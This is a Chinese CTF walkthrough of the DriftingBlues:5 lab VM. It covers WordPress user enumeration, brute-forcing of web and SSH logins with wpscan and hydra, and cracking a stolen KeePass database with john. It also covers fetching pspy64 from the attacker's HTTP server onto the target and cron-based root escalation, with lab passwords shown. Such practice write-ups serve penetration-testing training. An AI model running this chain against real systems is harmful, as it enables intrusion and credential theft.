---
title: driftingbules:5 靶场解析及复现
url: https://www.freebuf.com/articles/web/387370.html
source: FreeBuf网络安全行业门户
date: 2024-03-09
fetch_date: 2025-10-04T12:10:29.016924
---

# driftingbules:5 靶场解析及复现

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

driftingbules:5 靶场解析及复现

* ![]()
* 关注

* [Web安全](https://www.freebuf.com/articles/web)

driftingbules:5 靶场解析及复现

2024-03-08 17:46:04

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

**kali的IP地址：192.168.200.14**

**靶机IP地址：192.168.200.60**

# 一、信息收集

## 1.对利用nmap目标靶机进行扫描

由于arp-scan属于轻量级扫描，在此直接使用nmap进行对目标靶机扫描开放端口

```
nmap -A -p 1-65535 192.168.200.60
```

使用nmap扫描 开放的端口是22（ssh）、80（http）端口

![1703208594_6584e692544d0a6888142.png!small?1703208596053](https://image.3001.net/images/20231222/1703208594_6584e692544d0a6888142.png!small?1703208596053)

## 2.访问网站

发现框架是wordpress框架，或者也可以使用wappalyzer、whatweb

![1703208602_6584e69a085375b16849d.png!small?1703208604047](https://image.3001.net/images/20231222/1703208602_6584e69a085375b16849d.png!small?1703208604047)

既然是wordpress系统，那么后台登录页面就是wp-login.php

![1703208610_6584e6a2cb4bea26b2e46.png!small?1703208612125](https://image.3001.net/images/20231222/1703208610_6584e6a2cb4bea26b2e46.png!small?1703208612125)

# 二、漏洞探测

## 3.wpsan 爆用户名

使用专门扫描wordpress得wpsan

使用wpscan扫描下账户信息，发现gadd、gill、collins、satanic、abuzerkomurcu账户。

```
wpscan --url "http://192.168.200.60/" -e u #对目标网页进行扫描
```

![1703208621_6584e6ad2711aad5ac80a.png!small?1703208623267](https://image.3001.net/images/20231222/1703208621_6584e6ad2711aad5ac80a.png!small?1703208623267)

此时，已经拥有了**用户名**将之保存到username.txt下，在寻找登陆密码

```
gobuster dir -u http://192.168.200.60  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -x php,jpg,txt,html
```

![1703208631_6584e6b7a6b7f5676f055.png!small?1703208633216](https://image.3001.net/images/20231222/1703208631_6584e6b7a6b7f5676f055.png!small?1703208633216)

![1703208639_6584e6bfccfc52843f188.png!small?1703208641077](https://image.3001.net/images/20231222/1703208639_6584e6bfccfc52843f188.png!small?1703208641077)

对网站进行扫描之后，没有发现密码本类似得信息

## 4.用 cewl 爬取网站密码：

```
cewl -m 6 -w passwd.txt http://192.168.200.60 # 爬取网页信息，保存到passwd.txt中
```

![1703208647_6584e6c742cde62233177.png!small?1703208648613](https://image.3001.net/images/20231222/1703208647_6584e6c742cde62233177.png!small?1703208648613)

## 5.wpscan爆破后台登录账户密码

对刚才发现的几个账户进行密码爆破，

```
wpscan --url http://192.168.200.60 -U username.txt -P passwd.txt
```

![1703208655_6584e6cf8388008fc2f96.png!small?1703208657081](https://image.3001.net/images/20231222/1703208655_6584e6cf8388008fc2f96.png!small?1703208657081)

有一组符合条件

```
账户名：gill
密码:interchangeable
```

成功进入后台

![1703208662_6584e6d699f4e8de27b47.png!small?1703208664110](https://image.3001.net/images/20231222/1703208662_6584e6d699f4e8de27b47.png!small?1703208664110)

这个图片在index.php页面没有显示被隐藏，那么首先进行图片隐写的研究

![1703208673_6584e6e14930396a443ba.png!small?1703208675186](https://image.3001.net/images/20231222/1703208673_6584e6e14930396a443ba.png!small?1703208675186)

右键复制链接下载到kali当中。

```
wget 192.168.200.60/wp-content/uploads/2021/02/dblogo.png # 下载
```

## 6.识别图片隐藏信息

> Exiftool dblogo.png
> 这个工具可以识别出一些我们在一般情况下无法识别的图片中的信息

**有ssh 的密码，用户名用之前的那五个用户名试试**

![1703208690_6584e6f22c1d6274dc50d.png!small?1703208691659](https://image.3001.net/images/20231222/1703208690_6584e6f22c1d6274dc50d.png!small?1703208691659)

![1703208696_6584e6f80ec0f7e594b56.png!small?1703208698316](https://image.3001.net/images/20231222/1703208696_6584e6f80ec0f7e594b56.png!small?1703208698316)

```
用之前wpsacn扫描出得五个账户名进行尝试提供得SSH密码为：59583hello
```

## 7.九头蛇爆破

```
hydra -L username.txt -p 59583hello ssh://192.168.200.60
```

![1703208703_6584e6ff2ef879acb1dc2.png!small?1703208704810](https://image.3001.net/images/20231222/1703208703_6584e6ff2ef879acb1dc2.png!small?1703208704810)

使用用得到的账户和密码进行SSH登录

![1703208713_6584e709e6717e91f7a4b.png!small?1703208715744](https://image.3001.net/images/20231222/1703208713_6584e709e6717e91f7a4b.png!small?1703208715744)

查看文件，**得到的第一个flag**

![1703208721_6584e711ad735e787b13d.png!small?1703208723919](https://image.3001.net/images/20231222/1703208721_6584e711ad735e787b13d.png!small?1703208723919)

而尝试查看具有提权 得线索后，也没有什么用途那么只能从kbdx文件找入手得点了。

![1703208730_6584e71a46dabdca29d7e.png!small?1703208732022](https://image.3001.net/images/20231222/1703208730_6584e71a46dabdca29d7e.png!small?1703208732022)

## 8.KDBX文件利用

**目录下有个 kdbx 文件 ：**

KDBX文件:由密码管理器KeePass Password Safe创建的文件;存储密码的加密数据库，该数据库只能使用用户设置的主密码进行查看； 用于安全存储Windows，电子邮件帐户，FTP站点，电子商务站点和其他目的的个人登录凭据。

将kbx文件下载到kali

```
scp -rp gill@192.168.200.60:/home/gill/keyfile.kdbx /tmp
```

![1703208738_6584e722c802f4c664ccb.png!small?1703208740288](https://image.3001.net/images/20231222/1703208738_6584e722c802f4c664ccb.png!small?1703208740288)

## 9.keepass2john 工具获取hash

传到 kali 上破解，kali 上有个 keepass2john 工具，可以获取 kdbx 文件中的密码哈希值

![1703208746_6584e72a53b5b8f2115e7.png!small?1703208747581](https://image.3001.net/images/20231222/1703208746_6584e72a53b5b8f2115e7.png!small?1703208747581)

## 10.john 暴破哈希值

有哈希值，尝试用 john 暴破哈希值

![1703208754_6584e732a58bddd9c3637.png!small?1703208756227](https://image.3001.net/images/20231222/1703208754_6584e732a58bddd9c3637.png!small?1703208756227)

得到个密码：porsiempre，无法切换到root用户。

第一种方法：利用keepass工具。导入 kdbx 文件并填写刚才暴破出来的密码

标题可能会是root得密码

```
2real4surreal
buddyretard
closet313
exalted
fracturedocean
zakkwylde
```

![1703208767_6584e73ff333ce0febfc3.png!small?1703208769575](https://image.3001.net/images/20231222/1703208767_6584e73ff333ce0febfc3.png!small?1703208769575)

![1703208773_6584e745d6046cd270765.png!small?1703208775092](https://image.3001.net/images/20231222/1703208773_6584e745d6046cd270765.png!small?1703208775092)

第二种利用在线工具：<https://app.keeweb.info/>

将kdbx文件上传，输入john爆破得hash密码登录

![1703208781_6584e74d2d7ed65f5f091.png!small?1703208782306](https://image.3001.net/images/20231222/1703208781_6584e74d2d7ed65f5f091.png!small?1703208782306)

回到kali得终端，发现根目录下存在keyfolder，发现 /keyfolder，这应该就是 KeePass 的文件。

![1703208788_6584e7547f939325af5d5.png!small?1703208790245](https://image.3001.net/images/20231222/1703208788_6584e7547f939325af5d5.png!small?1703208790245)

这个文件得权限只有root得用户和其他用户有权限操作，但是进入文件夹之后可以看到是个空文件夹。

里面应该隐藏信息， 上传pspy64，赋予执行权限，然后**执行该文件**，发现**定时执行/root/key.sh文件**，根据名字猜测是和密码有关

> 在kali上开启一个http服务，然后利用wget 192.168.200.14:8000/pspy64指令上传至靶机

下载pspy64链接。

```
https://github.com/DominicBreuker/pspy
```

![1703208796_6584e75cc24b597606640.png!small?1703208799099](https://image.3001.net/images/20231222/1703208796_6584e75cc24b597606640.png!small?1703208799099)

# 三、定时任务提权

根据大佬文章提示，使用keyfile.kdbx文件中的名称，新建文件，一旦建立正确的文件名，就会获得一个新的文件。

（注：耐心等待）

![1703208514_6584e642b397d3ce5d5e7.png!small?1703208516047](https://image.3001.net/images/20231222/1703208514_6584e642b397d3ce5d5e7.png!small?1703208516047)

密码：imjustdrifting31

![1703208528_6584e65053d49a3cb681f.png!small?1703208534519](https://image.3001.net/images/20231222/1703208528_6584e65053d49a3cb681f.png!small?1703208534519)

至此，结束！

总结：

1.nmap扫描开放端口

2.cewl 生成字典、针对wordpress文件系统得wpscan 工具暴破使用、九头蛇爆破工具

2.Exiftool 来对EXIF信息解析

3..kdbx文件密码破解

4.若开启不了web服务可以使用scp这个命令

```
scp 用户名@靶机IP地址:/home/gill/key* /root
```

5.解密 keepass 数据库获取密码

6.定时任务提权，下载脚本pspy64 ，创建与之对应得key文件提权。

补充：SCP

SCP是linux系统下基于**SSH**登陆进行安全的远程文件**拷贝**命令，**复制文件和目录**。

格式：

> scp [参数] [原路径] [目标路径]

# 渗透测试 # 网络安全 # web安全

免责声明

1.一般免责声明：本文所提供的技术信息仅供参考，不构成任何专业建议。读者应根据自身情况谨慎使用且应遵守《中华人民共和国网络安全法》，作者及发布平台不对...